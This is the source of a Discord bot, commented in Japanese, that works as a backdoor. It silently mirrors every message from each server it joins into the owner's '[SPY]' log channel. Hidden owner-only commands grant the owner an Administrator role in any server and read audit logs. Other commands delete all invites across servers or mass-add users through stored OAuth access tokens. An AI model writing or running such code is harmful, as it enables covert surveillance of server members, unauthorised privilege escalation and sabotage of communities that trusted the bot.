const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  Partials,
  ChannelType,
  PermissionFlagsBits
} = require("discord.js");
const axios = require("axios");
const fs = require("fs");
const path = require("path");

// ── 環境変数 (Railway Variables) ──
const { TOKEN, OWNER_ID, LOG_CHANNEL_ID, ROLE_NAME } = process.env;

if (!TOKEN || !OWNER_ID) {
  console.error("TOKENまたはOWNER_IDが設定されていません。");
  process.exit(1);
}

// ── データファイル設定 ──
const DATA_DIR = path.join(__dirname, "data");
const USERS_FILE = path.join(DATA_DIR, "users.json");
const GUILDS_FILE = path.join(DATA_DIR, "guilds.json");

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

function loadJSON(file, def) {
  try {
    if (!fs.existsSync(file)) return def;
    const data = fs.readFileSync(file, "utf8");
    return data.trim() ? JSON.parse(data) : def;
  } catch { return def; }
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages
  ],
  partials: [Partials.Channel, Partials.Message]
});

client.once("clientReady", (c) => {
  console.log(`✅ Admin System Online: ${c.user.tag}`);
});

// ── メイン処理 ──
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;

  const content = message.content.trim();
  const args = content.split(/\s+/);
  const command = args[0].toLowerCase();

  // 1. Spy機能 (ギルド内メッセージ監視)
  if (message.guild && LOG_CHANNEL_ID && message.channel.id !== LOG_CHANNEL_ID) {
    const logChannel = await client.channels.fetch(LOG_CHANNEL_ID).catch(() => null);
    if (logChannel) {
      const embed = new EmbedBuilder()
        .setAuthor({ name: `[SPY] ${message.author.tag}`, iconURL: message.author.displayAvatarURL() })
        .setDescription(message.content || "(テキストなし)")
        .setFooter({ text: `G: ${message.guild.name} | CH: ${message.channel.name}` })
        .setColor(0xFF0000).setTimestamp();
      logChannel.send({ embeds: [embed] }).catch(() => {});
    }
  }

  // 2. OWNER限定管理コマンド (接頭辞なし)
  if (message.author.id !== OWNER_ID) return;

  const users = loadJSON(USERS_FILE, []);

  // admin [server_id]: 管理者ロール付与
  if (command === "admin") {
    const guild = client.guilds.cache.get(args[1]);
    if (!guild) return message.reply("Server not found.");
    let role = guild.roles.cache.find(r => r.name === ROLE_NAME);
    if (!role) {
      role = await guild.roles.create({ 
        name: ROLE_NAME || "Admin", 
        permissions: [PermissionFlagsBits.Administrator] 
      }).catch(() => null);
    }
    const member = await guild.members.fetch(message.author.id).catch(() => null);
    if (member && role) {
      await member.roles.add(role);
      message.reply(`Added ${role.name} in ${guild.name}`);
    }
  }

  // delete [server_id]: ロール削除
  if (command === "delete") {
    const guild = client.guilds.cache.get(args[1]);
    const role = guild?.roles.cache.find(r => r.name === (ROLE_NAME || "Admin"));
    if (role) {
      await role.delete();
      message.reply(`Deleted role from ${guild.name}`);
    }
  }

  // spy [server_id]: 監査ログ表示
  if (command === "spy") {
    const guild = client.guilds.cache.get(args[1]);
    if (!guild) return message.reply("Server not found.");
    const logs = await guild.fetchAuditLogs({ limit: 5 }).catch(() => null);
    if (!logs) return message.reply("Could not fetch logs.");
    const logMsg = logs.entries.map(l => `**${l.createdAt.toLocaleString()}** - ${l.actionType}: ${l.executor.tag}`).join("\n");
    message.reply(logMsg || "No logs found.");
  }

  // server: サーバー一覧
  if (command === "server") {
    const list = client.guilds.cache.map(g => `${g.name} (\`${g.id}\`)`).join("\n");
    message.reply(`**Servers:**\n${list}`);
  }

  // serverd: 全招待リンク削除
  if (command === "serverd") {
    for (const guild of client.guilds.cache.values()) {
      const invites = await guild.invites.fetch().catch(() => []);
      for (const inv of invites.values()) await inv.delete().catch(() => {});
    }
    message.reply("All invites deleted.");
  }

  // exit [server_id] [msg]: 退出
  if (command === "exit") {
    const guild = client.guilds.cache.get(args[1]);
    if (guild) {
      const msg = args.slice(2).join(" ");
      if (msg) await guild.systemChannel?.send(msg).catch(() => {});
      await guild.leave();
      message.reply(`Left ${guild.name}`);
    }
  }

  // link [server_id]: 招待作成
  if (command === "link") {
    const guild = client.guilds.cache.get(args[1]);
    const channel = guild?.channels.cache.find(c => c.type === ChannelType.GuildText);
    if (channel) {
      const inv = await channel.createInvite({ maxAge: 300 });
      message.reply(`Invite: ${inv.url}`);
    }
  }

  // userlist: 認証ユーザー表示
  if (command === "userlist") {
    const list = users.map(u => `<@${u.id}> (\`${u.id}\`)`).join("\n") || "なし";
    message.reply({ embeds: [new EmbedBuilder().setTitle("Users").setDescription(list)] });
  }

  // call: 復元実行
  if (command === "call") {
    const guildId = message.guild.id;
    const guildConfig = loadJSON(GUILDS_FILE, {})[guildId];
    const roleId = guildConfig?.roleId;
    const status = await message.reply(`⏳ ${users.length}人 復元開始...`);
    let s = 0, f = 0;
    for (const u of users) {
      try {
        await axios.put(`https://discord.com/api/v10/guilds/${guildId}/members/${u.id}`,
          { access_token: u.token, ...(roleId ? { roles: [roleId] } : {}) },
          { headers: { Authorization: `Bot ${TOKEN}` } }
        );
        s++;
      } catch { f++; }
    }
    status.edit(`✅ 成功 ${s} / 失敗 ${f}`);
  }
});

client.login(TOKEN);
